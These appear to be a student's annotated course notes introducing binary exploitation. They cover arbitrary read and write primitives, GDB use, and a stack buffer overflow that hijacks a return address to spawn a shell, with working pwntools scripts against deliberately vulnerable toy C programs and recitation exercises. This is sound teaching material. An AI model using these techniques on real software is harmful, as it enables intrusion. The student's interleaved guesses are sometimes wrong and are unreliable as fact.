## Takeaways
### Using GDB
- How to use GDB
	- where to set breakpoint?
		- Right after we enter our input to the buffer
			- Why? Check our input is in the buffer
			- How to see addr of buffer?
				- read's 2nd arg is the addr of buffer
				- and the 2nd arg, by calling convention, is RSI, which is RBP-0x30
	- see stack view on gdb (binja also has stack view)
- what happens on GDB when you "pop a shell"?
	- gdb hangs. then you can test your exploit out on the actual remote server
	- note: don't hardcode addresses (i.e. copy paste the addr on gdb and use those to write your script to attack the remote server)


Examples of GDB commands:
p/x $rbp-0x30
- see the address
x/10xb 0x123
- dereference the provided mem. addr
- see 10 individual hex bytes starting at the addr 0x123
x/10i $rip
- dump the ten next instructions




With a strong foundation in reverse engineering we are now ready to shift our goal to binary exploitation. Binary exploitation is a broad term, but generally refers to taking advantage of vulnerabilities at the binary level in order to force a system to execute different or arbitrary functionality. This is different from higher-level attacks such as network attacks or application misconfigurations.
1. How is "binary exploitation" different to reverse-engineering statically and dynamically?
	1. My hypothesis [TO BE TESTED]: 
		1. We are no longer just observing the program or stepping through the code; we are actively trying to enter malicious input (e.g. stack overflow to overwrite the return address after executing a function; return to a protected function) to corrupt the program's behaviour
		2. Does this mean we are not examining a compiled binary anymore, but directly attacking the running program on a remote server?
			1. Or maybe it's both. Maybe we need to first examine the compiled binary file to understand the program, and then find ways to actively exploit the running program
2. "This is different from higher-level attacks such as network attacks or application misconfigurations" How is it different? What are examples of network attacks and application misconfigs?
	1. My hypothesis on network attacks: DDoS
		1. What does DDoS stand for? 
		2. I know it attacks a server by overwhelming it with  requests over the network. A flooding attack.
	2. What is application misconfig?
		3. My attempt at an example: 
			1. Not configuring admin privileges carefully (what specifically does this look like), thus allowing attackers to gain admin privileges? 


[SUMMARY: Learning Objective - pop a shell]
We leverage binary vulnerabilities in order to achieve an end goal of _remote code execution_, or RCE. RCE can be anything, but usually _proofs of concept_, POCs, include reading or writing to the filesystem, exfiltrating in-process secrets, or _popping a shell_. **Our goal in the upcoming lessons is to pop a shell, which is to force the program to execute `system(/bin/sh)` (or other shell) as the current user.**  From that shell we can read the `flag` file on the system as proof of our exploit.
3. What new acronym did we introduce and what does it mean?
	1. RCE. Remote Code Execution. 
4. What does "popping a shell" mean?
	1. I think it is creating a new instance of the terminal. Literally a new shell is created and pops up. 
	2. technical def = execute system(/bin/sh)
		1. Is this particular line of code specific to Python? Is it python at all? Or C? Or all of them? 
		2. Give me a sample program of using this line of code
		3. How do we execute this line of code? Is it through input, that we inject this line of code and somehow run it? Or is this line of code already present in the program we're exploiting, and we just need to find ways to execute this function?
			1. I am leaning towards the former, because why would a normal program include a line of code to execute system call? Maybe there is. But I haven't seen them so far...
			2. Assuming it is injecting a system-call code: 
				1. Can I execute this attack on any program? 
5. How does "popping a shell" relate to hacking?
	1. If you pop a shell on the server, you essentially gain control of the server computer. You will be able to access all the files on the server, including the flag. 
	2. Wow that is quite miraculous. By crafting input (I suppose that is how we do this?), we can get into a computer through one of its running programs. 

[SUMMARY: Learn common bug types first.]
The key to binary exploitation is finding and leveraging vulnerabilities. We classify these vulnerabilities according to their capabilities to better understand what we have and what we still need. We will begin our study of exploitation by looking at some common bug classes and then demonstrate our knowledge by throwing our first binary exploit—a stack buffer overflow!

Table of Contents
* [[#Primitives]]
	* [[#Reads (Leaks)]]
	* [[#Writes (Memory Corruption)]]
* [[#Practical Example - Stack Buffer Overflows]]
	* [[#`gets`]]
	* [[#Hijacking Execution]]
* [[#Recitation]]
* [[#Next Steps]]

## Primitives

[SUMMARY: def(primitives) = security vulnerabilities]
We will define security vulnerabilities as primitives going forward. A primitive is anything "weird" that we can influence in the system. It can be anything from a controllable stack buffer overflow to flipping a single bit in memory. A primitive in and of itself might not be enough to control the system; exploits of modern systems typically require handfuls of primitives chained together to increase the power and reach of the individual vulnerabilities. In this lesson we introduce two primitive classes which form the basis of binary exploitation: reads and writes.
- What are specific examples of security vulnerabilities, also known as "primitives"?
	- A buffer on the stack which we can overflow
		- e.g. buffer initialized to receive user input
	- Bits in memory that we can flip
	- More?

[SUMMARY: 2 specific types of primitives: reads and writes]
6. Are "reads" and "writes" vulnerabilities introduced because they will become tools for us to eventually pop a shell? (what is the significance of reads and writes in the context of binary exploitation)
### Reads (Leaks)

We talked a lot about PIE and ASLR at the beginning of this course because they are fundamental security measures in modern systems. Base offset randomization introduced by these protections means an attacker (us) has no idea where the binary and libraries reside in memory. Depending on our target and our other primitives, a read might not be necessary—but for most modern systems we need to _break_ ASLR and/or PIE to find information in the binary, leverage glibc functions like `system`, etc.
7. What exactly is base offset?
	1. I understand that the OS allocates a process its own chunk of memory. "Here's all the memory that you can use!" Is the offset picking a random starting point within this block of memory? What if I pick the base address to be close to the "end" of this assigned block of memory...doesn't that mean I waste a lot of usable memory? Or does the memory wrap around, as in, if I finish using up to the end of this memory block, I continue writing the start of the memory block?
	2. Or does offset mean
8. What exactly is a read primitive?
	1. Reading information about a program while it runs? E.g. us leaking the actual memory address of a particular function so we can use it to calculate the base address
		1. YES :)
		2. Another possible thing to leak is the absolute address of a global variable. We could also use that to calculate the base address. 
			1. if you leak any addr in a block, you can calculate the absolute address of anything WITHIN that block. e.g. within main, or for a shared imported lib, it's everything within the lib
	2. Summary: def(read primitive) = reading things we shouldn't be, like absolute mem. addr
	3. Update:
		   - "read" refers to a read function, like getting user input is reading sth from a file stream or input stream and storing that input into a buffer
1. What is the difference between PIE and ASLR again?
	1. A binary can be PIE. ASLR is the process of randomizing where the binary gets loaded in memory when it runs. ASLR only works on binaries that are PIE.


Thus, a read primitive which can leak data—such as the address of a function or location of a global variable—in the virtual memory space can help us identify the base address of a library and other functions in that library, similar to how we practiced in [[0. Operating Systems Refresher & Pwntools]]. 

Reads can be limited or unlimited. We refer to unlimited reads as "arbitrary reads," meaning that we control the address we want to read from. [[arb_read.c |Consider the following example]], which is a toy binary that contains a hidden secret:
10. Diving reads vulnerabilities into two categories: "limited" and "unlimited"
	1. what do think it means? My hunch is that an unlimited leak is better than a limited leak, because unlimited suggests we can get more useful info out of the leak
	2. limited leak
		1. your leak is constrained to which 
	3. unlimited leak
		1. you can choose where in memory to leak and how much to read
11. What is a "read" vulnerability again?
12. ^ allows me to read the value of specific memory addresses at runtime
13. 

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

#define BUF_LEN 0x20

int secret_value = 0x13371137;

int main() {
    char buf[BUF_LEN];
    puts("Hi, give me a number!");
    read(0, buf, BUF_LEN);

    printf("%llx\n", **(unsigned long long**)buf);
    // takes raw bytes from user and interpret in little-endian
    // why? bc if we write "0x123" and enter it, we'd convert those bytes
    // into unsigned long long by using strtol(). but here, no such fn is used
    
    // buf is a char pointer, pointing to an array of length BUF_LEN
    // take the first 8 bytes, treat them altogether to mean an address (double ptr)
    // QUESTION: why send raw bytes in little endian?
    // it's interpretted as an address (pointing to an address that pts to an
    //unsigned long long). are addresses also stored in little-endian?
}
```
11. What does the printf line syntax mean inside the string?
	1. I understand the string contains placeholders, and the following arguments are the actual values to be filled into the corresponding placeholders. Must the arguments be arranged in order? 
	2. %llx means what?
		1. I think ll means long long
		2. what about x? unsigned?
		3. or does % mean unsigned?
	3. What are the asterisks doing there in the second argument?
		1. Double dereference?
		2. so the buffer is a double pointer? as in the buffer contains an address of a variable, which in turn contains the address of the user input string? 
	4. What is "long long"? 
		1. I know "long" is 8 bytes. So is "long long" double that, 16 bytes? 


The vulnerability here is contrived but illustrates the capabilities of an arbitrary read. The program accepts input from the user, casts that input as an address (`unsigned long long*`), and writes back the value at that address to the user.
- Summarise this program and why it's vulnerable
	- This program reads user input. User input gets cast to a memory address. Later, the program derefs this memory address and writes its value back to the user. 
	- Say there's a secret message whose memory address we know. We can enter that as the memory address, and the program will write back to us the value of the secret message!
	- Which makes this an arbitrary read, because I can enter whatever memory address I want, and the program reads it back to me (only requirement is it must be a valid memory address)
- Reinforce what "read" primitive means?
	- "read" primitive is a type of security vulnerability where the program reads user input and writes back to us the value at a memory address

There is a huge caveat here: the address _must_ be a valid address in memory and it must be on a readable page. Providing an unmapped or unreadable memory address results in a `SIGSEGV` signal indicating a _segmentation fault_ or _segfault_. Segfaults crash the program, meaning we need to restart our exploit from the beginning.
12. What do segfaults do to the program?
	1. Crashes the program, which forces us to start from scratch and rerun the program.

If we compile this binary (TYPO FOUND! source code, not binary) with `gcc arb_read.c -o arb_read -no-pie -fno-PIC` we force the compiler to abandon its default PIE compilation setting and end up with a [[arb_read| no-pie binary]]. We can easily fetch the address of the `secret_value` symbol (since this binary is not stripped) using `readelf`:
13. What does every chunk of this gcc command mean?
	1. gcc - calls the gcc compiler
	2. arb_read.c is the c file we wish to compile
	3. -o arb_read specifies the output object file should be called arb_read
	4. -no-pie means we make the resultant binary not a PIE file. 
	5. -fno-PIC ???


```console
$ readelf -Ws arb_read | grep secret_value
    25: 0000000000404030     4 OBJECT  GLOBAL DEFAULT   25 secret_value
```

The next step is understanding how to send the address. We see no call to `atoi`, `strtol`, or similar function to convert ASCII numerals to an integer. Consequently we must send raw bytes which will be stored in memory as a little-endian value representing an address. Let's create a simple Python script with `pwntools` to send these bytes. We'll use the `pwntools.ELF` module, as we introduced in [[1. Reverse Engineering Tools]], to fetch the address from `pwntools` instead of hard-coding it. This is extremely useful when we want our scripts to be configurable for different versions of a target that have different offsets.
- Why are we sending an address now? 
	- Because in the toy example, user input will be interpreted as a memory address and the program will write to us the value stored at that memory address.

```python
from pwn import*

binary_name = "arb_read"

e = ELF(binary_name)
p = process(binary_name)
p.send(p64(e.symbols.secret_value))
p.interactive()
```

Why using p64:
We use the **`p64` utility to encode the integer as `bytes` in little-endian format.** _


It's important to send all eight bytes, including leading zeros—otherwise we risk relying on bytes already residing in the buffer which may be non-zero_. Keeping the socket open with `p.interactive()` shows the response from the server, which is the hexadecimal representation of `secret_value`!

Read primitives are not always this powerful—in some cases we can only leak a single byte's value or the non-zero bytes trailing a string. We'll get more practice with different types of read primitives in the coming weeks and learn how to leverage them to be more powerful in conjunction with other vulnerabilities! 

### Writes (Memory Corruption)

A quintessential binary exploitation vulnerability class is memory corruption. But simply stating "this program has a memory corruption vulnerability" is not sufficient to understand the power of the bug. Does it uncontrollably change an address to `0x0`, thus causing a null-dereference error? Such would result in a _denial of service_ (DOS) attack, but would not be useful for attaining RCE. Like with reads, we must further classify writes according to their capabilities.

Also like reads, we have the concept of an arbitrary write. This is an extremely powerful primitive, especially in conjunction with an arbitrary read. Such a pair normally results in RCE, no matter how many protections are in place.
- What is a write? What is a read?
- Is there a "normal" write that is not arbitrary? Or are all writes "arbitrary"?

Let's take a look at a simple binary that should never result in a winning condition:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

#define BUF_LEN 0x20

int secret_value = 0x13371137;

int main() {
    char buf[BUF_LEN];
    puts("Hi, give me a number!");
    read(0, buf, BUF_LEN); // treat first user input as addr (int **)
    int* addr = *(int**)buf; 
    puts("Hi, give me another number!");
    read(0, buf, BUF_LEN); // second value will be stored into addr
    // if we know the addr of secret_value, we can use these two inputs
    // to change the secret_value to 0xdeadbeef
    int val = *(int*)buf;
    *addr = val;
    printf("My secret value is: %x\n", secret_value);
    if (secret_value == 0xdeadbeef) {
        puts("Yes, you win!");
    } else {
        puts("Nope, try the arbitrary write again!");
    }
}
```

We see above that the `secret_value` is initialized to `0x13371337` and never overwritten. The only access is to print its value before a comparison which does not modify its value.

> We actually need the `printf("My secret value is: %x\n", secret_value);` memory access otherwise the program will _never_ win. `gcc` runs optimizations to check for dead code. If `secret_value` is never accessed, it sees no need for the `if` statement and eliminates that branch, causing a failure in every case!

The beginning of this program is similar to the arbitrary read, and again we need to compile with `gcc arb_read.c -o arb_read -no-pie -fno-PIC` to ensure that we know where `secret_value` is in memory. In this case we're given extra functionality, which is writing a value of our choice to the memory address we specify. Again, we must send the values in binary bytes because there is no conversion between ASCII numerals and decimal values. Let's write another simple Python script with `pwntools` to leverage the vulnerability.
- How is this even a real-life situation? You would need access to the raw source code in order to compile it with no-PIE. In real-life, don't we only get access to compiled binaries? Or are there really situations where we get the source code?

```python
from pwn import*

binary_name = "arb_write"

e = ELF(binary_name)
p = process(binary_name)
p.send(p64(e.symbols.secret_value))
p.recvuntil(b"another number!")
p.send(p64(0xdeadbeef))
p.interactive()
```

> This program has back-to-back reads which expect separate values. Running two `p.send()` commands in sequence will likely result _all values sent being read in the first call_. For that reason we must make sure to sync with the binary by waiting for the second prompt before sending it.

Running the program shows that `secret_value`'s value was modified, and we passed the condition!

Like reads, writes can be bounded and unbounded. It's not uncommon to see primitives such as single null byte overflow (due to bad string length calculation when null-terminating a string) that are turned into full RCE. In the next section we will get experience with one of the quintessential memory corruption vulnerabilities: a stack buffer overflow.

## Practical Example - Stack Buffer Overflows

Stack buffer overflows were thrust into the spotlight in the mid-nineties when Aleph One published their [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) Phrack article. The stack buffer overflow was so pervasive and powerful that the stack canary mitigation was introduced and adopted as a baseline standard in modern compilers. Furthermore, the `gets` function, called out specifically by Aleph One, is now flagged in its own `man` page and by `gcc` as vulnerable.

```
gets(3)                                                                                Library Functions Manual                                                                                gets(3)

NAME
       gets - get a string from standard input (DEPRECATED)

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <stdio.h>

       [[deprecated]] char *gets(char *s);

DESCRIPTION
       Never use this function.
```

```console
$ gcc stack.c -o stack -no-pie -fno-stack-protector -fno-pic
/usr/bin/ld: /tmp/ccMZqxy2.o: in function `greet':
stack.c:(.text+0x44): warning: the `gets' function is dangerous and should not be used.
```

Clang (LLVM) takes it a step further and compiles a warning _into the program_ so that you cannot simply ignore it at compile time.

```console
$ clang stack.c -o stack 
stack.c:12:5: warning: 'gets' is deprecated: This function is provided for compatibility reasons only.  Due to security concerns inherent in the design of gets(3), it is highly recommended that you use fgets(3) instead. [-Wdeprecated-declarations]
$ ./stack
Hi, what's your name??
warning: this program uses gets(), which is unsafe.
```

We're familiar with the stack from our reverse engineering efforts, but let's look at it specifically in the context of a stack buffer overflow.

### `gets`
[SUMMARY: gets() function is vulnerable bc it does not check length of user input --> allows for buffer overflow]

`gets` is bad and should never be used in production. That said, it's a great place to start as we build our exploitation skills. `gets`, as its name implies, gets user input from `stdin` into a buffer. _There are no length checks, so the user can theoretically write more data into the buffer than it can hold_. The following [[stack.c]] example uses a stack buffer for the argument to `gets`, resulting in a potential stack buffer overflow.

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

void win() {
	printf("If you make it here, you win!");
	system("/bin/sh");
	exit(0);
}

void greet() {
	char buf[0x20]; // buffer lives on the greet() fn's stack
    puts("Hi, what's your name??");
    gets(buf);
    printf("Hello, %s\n", buf); // 
    // exploit this: make return addr (after running greet) the addr of win()
}

int main() {
	greet();
	return 0;
}
```

We need to compile with specific flags to allow a stack buffer overflow, specifically `-fno-stack-protector`. We add `-w` to ignore the `gets` warnings from the compiler.

```bash
gcc stack.c -o stack -fno-stack-protector -no-pie -fno-pic -w
```

If we send `0x20` or fewer bytes (taking into account the `\n` character when we press `<enter>` in a terminal) we should expect normal behavior. Sending more than `0x20` bytes is when behavior is undefined. To understand specifically how to control this undefined behavior we need to look at the stack in more detail. Let's open the binary in Binja and use its stack view icon on the righthand toolbar to visualize the `greet` function. 

![[stack_binja.png]]
- note on stack view:
	- up: lower memory address
		- top of stack? because stack grows downwards so the top of the stack has lower address

Functions like `fgets` have a length field, which we've used in prior lessons, to define the length of a buffer. Unfortunately `gets` does not control the read (buffer) length, thus leading to the vulnerability. But this view still gives us an idea of where our input is stored on the stack relative to other data.

So, we can theoretically overflow this stack buffer, but what do we do with it? Remember our [[2. Reverse Engineering Basics#Prologue and Epilogue|prologue]]? We see the pushed return instruction pointer labeled as `__return_addr` and pushed stack base pointer labeled as `__saved_rbp`. In this case the return instruction pointer points to the instruction immediately following `call greet` in `main`. 

We have a fun `win` function which is never called nor referenced elsewhere, yet we want to execute that code to win. Stack buffer overflows in `x86_64` are powerful because they allow us to overwrite the pushed values on the stack, _specifically the pushed instruction pointer_. Remember that the `ret` instruction pops that pushed address into `rip` at a function's epilogue to continue execution in the calling function. What happens if we change that value to something different? Say we just try to clobber it with `0x4141414141414141` (a bunch of `A`s) first, to confirm we can reach and control it.

We need to clobber up to the point of the return address, and for this example we can use any input bytes we want (though this may not be the case in future examples or exercises). The screenshot from Binja shows that the buffer is `0x28` bytes below the return instruction pointer, so let's fill that space with `B`s (`0x42`). Since we're just sending ASCII data for this test we can run the binary locally and send `0x28` `B`s followed by eight `A`s:

```console
$ ./stack 
Hi, what's your name??
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
Segmentation fault (core dumped)
```

We see a segmentation fault and core dump! So we definitely triggered some nefarious behavior, but did we control the address we expected? In a situation like this we can quickly use `gdb` to examine the core dump in `/var/lib/systemd/coredump`. In this case we're specifically interested in whether or not we caused a crash because we controlled `rip` at the return from `greet`.
- What is a core dump?
	- Like a deluge of information?

```shell
unzstd /var/lib/systemd/coredump/<coredump file>
gdb stack /var/lib/systemd/coredump/<coredump file>
```

> Core dumps are not automatically generated with modern (`systemd`) Linux systems. Run `apt install systemd-coredump` and then crash the binary again. The associated core dump file will now be present in `/var/lib/systemd/coredump/`.

```gdb
Core was generated by `./stack'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000000401220 in greet ()
gef➤  context

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x38              
$rbx   : 0x7ffde48da8a8    
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x7ffde48da788    
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0xcc72a0          
$rdi   : 0x7ffde48da580    
$rip   : 0x0000000000401220  →  0x894855fa1e0ff3c3
$r8    : 0x73              
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x7ffde48da8b8    
$r14   : 0x0000000000403e00  →  0x0000000000401180  →  0x2ead3d80fa1e0ff3
$r15   : 0x00007ff4c5f6e000  →  0x00007ff4c5f6f2d0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address: '0x7ffde48da788'
──────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401219 <greet+0038>     call   0x4010a0 <printf@plt>
     0x40121e <greet+003d>     nop    
     0x40121f <greet+003e>     leave  
 →   0x401220 <greet+003f>     ret    
[!] Cannot disassemble from $PC
```

We see there is an unmapped address at `0x7ffde48da788`, which is the value of `rsp`. Let's see what's stored at that address by dumping some bytes at `rsp` and some instructions at the crashing `pc`:
- What does it mean for an address to be "unmapped"? illegal memory to access?

```gdb
gef➤  x/10xg 0x7ffde48da788
0x7ffde48da788:	0x4141414141414141	0x0000000000000000
0x7ffde48da798:	0x00007ff4c5c28150	0x0000000000000000
0x7ffde48da7a8:	0x0000000000401221	0x0000000100000000
0x7ffde48da7b8:	0x00007ffde48da8a8	0x00007ffde48da8a8
0x7ffde48da7c8:	0xa15b331af74ae2dd	0x0000000000000000
gef➤  x/4i 0x0000000000401220
=> 0x401220 <greet+63>:	ret
   0x401221 <main>:	endbr64
   0x401225 <main+4>:	push   rbp
   0x401226 <main+5>:	mov    rbp,rsp
```

Ah-ha! The program fails on the `ret` instruction as it tries to pop `0x4141414141414141` into `rip` because that address is not in memory. This means we have full control over `rip` as we leave `greet`!

> If we did not see `A`s in this location then we could adjust our padding (the `B`s) accordingly to make sure that our offset is correct and we fully control the value popped into `rip` by `ret`.

### Hijacking Execution

Now, what do we want to do with this power? Our end goal may vary based on our target and situation, but for the sake of this program we have a `win` function which spawns a shell. Let's change our `A`s to instead be a little-endian byte value of `win`'s address. Because this binary is no-PIE we know the address of `win`—if PIE is turned on then we must use a leak to find an address in the binary to break PIE.
[SUMMARY: if no PIE, hijack directly (eg. buffer overflow). If PIE, first leak an address to calculate the base address, then hijack]

> It's important to understand that we hijack execution with the _existing program state_. We control `rip` but currently do not control the value of other registers—aside from the popped RBP value we corrupt prior to the pushed RIP—or memory other than the stack buffer values we input. Because `win` takes no arguments we do not need to control any other registers (we will learn how to do this when we cover return oriented programming, a.k.a. ROP, and shellcoding) and thus can jump to the entry of the function without worrying about `rdi`, `rsi`, etc. being set to specific values. 
> 	- what does "return oriented programming" mean?

Because we need to send raw bytes (an address) which is not represented in ASCII, let's draft a Python script leveraging `pwntools`'s `ELF` utility to look up the function address:

```python
from pwn import *

e = ELF("./stack")
p = process("./stack")
p.recvuntil(b"??\n")
# need to send a negets
p.sendline(b'B' * 0x28 + p64(e.symbols.win))
# drop into interactive shell to use shell we popped!
p.interactive()
```

Let's throw this exploit and see what happens!

```
[+] Starting local process './stack': pid 2420133
[*] Switching to interactive mode
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xb6\x11@
[*] Got EOF while reading in interactive
$ ls
[*] Process './stack' stopped with exit code -11 (SIGSEGV) (pid 2420133)
```

We get a segmentation fault. Why does this happen? In a situation like this—when we think things should be working but they are not—we must debug. Let's switch to `gdb.debug` to throw our exploit with `pwntools` and debug the crash. What we see is that there is a crash on an `xmm` register in glibc's `do_system` call (OKAY! This is same crash location for my bypass-50 rn and yep, my stack ptr is not 16-byte aligned):

```gdb
Program received signal SIGSEGV, Segmentation fault.
0x00007fb0c3654f9b in do_system (line=0x402022 "/bin/sh") at ../sysdeps/posix/system.c:148

# ... snip ...

──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fb0c3654f88 <do_system+0158> lea    rsi, [rip+0x16b48c]        # 0x7fb0c37c041b
   0x7fb0c3654f8f <do_system+015f> mov    QWORD PTR [rsp+0x70], 0x0
   0x7fb0c3654f98 <do_system+0168> mov    r9, QWORD PTR [rax]
 → 0x7fb0c3654f9b <do_system+016b> movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7fb0c3654fa0 <do_system+0170> call   0x7fb0c370e360 <__GI___posix_spawn>
   0x7fb0c3654fa5 <do_system+0175> mov    rdi, rbx
   0x7fb0c3654fa8 <do_system+0178> mov    r12d, eax
   0x7fb0c3654fab <do_system+017b> call   0x7fb0c370e800 <__posix_spawnattr_destroy>
   0x7fb0c3654fb0 <do_system+0180> test   r12d, r12d
```

This hearkens back to our discussion of `x86_64` calling conventions. One of the calling convention specifications we did not cover is that `sp` must be 16-byte aligned (must end in a `0`, not an `8`) at the point of a `call` instruction and after the prologue of a function. 

From the [Microsoft documentation](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170):

> The stack pointer must remain 16-byte aligned in any region of code that isn't part of an epilog or prolog, except within leaf functions.

During normal operation, the `call` instruction pushes the **return instruction pointer** (the return address WHICH WE CORRUPTED) and the prologue pushes the return base pointer, which results in the stack remaining 16-byte aligned. However, when we corrupt `rip` to perform a "call," it actually acts like a jump—there is no `call` instruction used, we simply jump execution to the start of a new function. This does not push the return instruction pointer, but the prologue after the jump still pushes the return base pointer. The result is a `sp` that is eight-byte aligned which violates the calling convention requirement. This yields an error when using an `xmm` instruction—albeit much later in glibc—which expects the stack to be 16-byte aligned. This [Stack Overflow Post](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul) (very apropos, given our lesson on stack overflows!) explains more.

There is an easy option to circumvent this error. We cannot push the return instruction pointer but we can simply skip over the `endbr64; push rbp` instructions in the prologue by jumping a few instructions after the function's entry. We don't care about returning from the function in this example, so maintaining a "valid" stack is not important to our goal. Our modified script is below, using `pwntools`'s `asm` functionality to calculate the exact length of those instructions to add to the function's entry address:

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"

e = ELF("./stack")
p = gdb.debug("./stack", '''
    continue
''')
p.recvuntil(b"??\n")
# calculate length of `push rbp` instruction:
a = asm("endbr64 ; push rbp")
# need to send a newline for gets
p.sendline(b'B' * 0x28 + p64(e.symbols.win + len(a)))
# drop into interactive shell to use shell we popped!
p.interactive()
```

When we try again, we get our intended result and have successfully performed our first binary exploitation attack!

```
[+] Starting local process '/usr/bin/gdbserver': pid 2420375
[*] running in new terminal: ['/usr/bin/gdb', '-q', './stack', '-x', '/tmp/pwntzm8nzse.gdb']
5
[*] Switching to interactive mode
Hello, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xbb\x11@
Detaching from process 2420395
$ whoami
root
```

## Recitation

#### Recitation 5.0

Write a script to leak each byte of `secret_key` from [[recitation5.0]], the compiled version of the following source code:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.0.c -o recitation5.0 -no-pie -fno-PIC
// no pie means when you dump the binary, you see the absolute addresses
// find the absolute address of secret_key = 0x404028

long secret_key = 0x6d79736563726574; // 8 bytes long

int main() {
    char buf[BUF_LEN];
    while (1) {
        puts("Hi, give me a number!");
        read(0, buf, BUF_LEN); // read user input
        write(1, *(void**)buf, 1); // write just one byte from buf to stdout
        // read one byte from buf, deref it, show it on stdout
        // every byte you enter should be an addr
        // strategy: run using gdb, dump the 8 bytes at 0x404028
        // deref those 8 bytes (address that contains secret_key)
    }
}
```

#### Recitation 5.1

Figure out how to leak an address to break ASLR and find the base address of the compiled [[recitation5.1]] with the following source code. _Hint: disassemble the `main` function to find useful stack values to leak._

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// 
long my_global = 0x4141414142424242;

// gcc recitation5.1.c -o recitation5.1

int main() {
    char buf[BUF_LEN];
    long* global_ptr = &my_global;
    long arr[4] = { 0xdeadbeefdeadbeef, 0x1337c0de1337c0de, 0xdaddb0dddaddb0dd,
                    0xc01d3315c01d3315 };
    // assume my_global and arr are stored tgt 
    // 
    puts("Hi, what index do you want?");
    read(0, buf, BUF_LEN);
    long idx = strtol(buf, NULL, 10); // 10 means we send the index in base 10
    printf("Your value is: %lx!\n", arr[idx]); // can be negative index
    // why can neg index? bc index is a long, which is signed
    // use gdb, look at assembly and determine what index to enter
    // to access my_global
    // how did we figure out ind should be -2? look at the stack view on Binja or gdb 
    
    return 0;
}
```

#### Recitation 5.2 

Similar to [[#Recitation 5.0]], leverage the loop and the one-byte arbitrary write vulnerability in [[recitation5.2]]. Corrupt the secret key and break out of the infinite loop.

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.2.c -o recitation5.2 -no-pie -fno-PIC

long secret_key = 0x6d79736563726574;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[BUF_LEN];
    char buf2[BUF_LEN];
    printf("My secret key is set to %lx\n", secret_key);
    while (1) {
        if (secret_key == 0xdeadbeef1337c0d3) {
            break;
        }
        printf("Hi, give me two numbers!\n> ");
        read(0, buf, BUF_LEN);
        printf("> ");
        read(0, buf2, BUF_LEN);
        **(char**)buf = *(char*)buf2;
    }
    puts("You win!");
}
```

#### Recitation 5.3

Combine your experience in [[#Recitation 5.1]] and [[#Recitation 5.2]] to leak the binary's base address and then corrupt the secret key in [[recitation5.3]] to the desired value:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

#define BUF_LEN 0x20

// gcc recitation5.3.c -o recitation5.3

long secret_key = 0x6d79736563726574;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    long* secret_key_ptr = &secret_key;
    long arr[4] = { 0xdeadbeefdeadbeef, 0x1337c0de1337c0de, 0xdaddb0dddaddb0dd,
                    0xc01d3315c01d3315 };
    char buf[BUF_LEN];
    char buf2[BUF_LEN];
    printf("My secret key is set to %lx\n", *secret_key_ptr);

    puts("What number is your favorite from this array?");
    read(0, buf, BUF_LEN);
    long idx = strtol(buf, NULL, 10);
    printf("Yeah, I like %lx too!\n", arr[idx]);

    while (1) {
        if (secret_key == 0xdeadbeef1337c0d3) {
            break;
        }
        printf("Hi, give me two numbers!\n> ");
        read(0, buf, BUF_LEN);
        printf("> ");
        read(0, buf2, BUF_LEN);
        **(char**)buf = *(char*)buf2;
    }
    puts("You win!");
}
```

## Next Steps

We have just scratched the surface of binary exploitation in this module. In the upcoming lessons we will gain familiarity with different primitives, leveraging leaks in conjunction with corruption to bypass common defensive mitigations!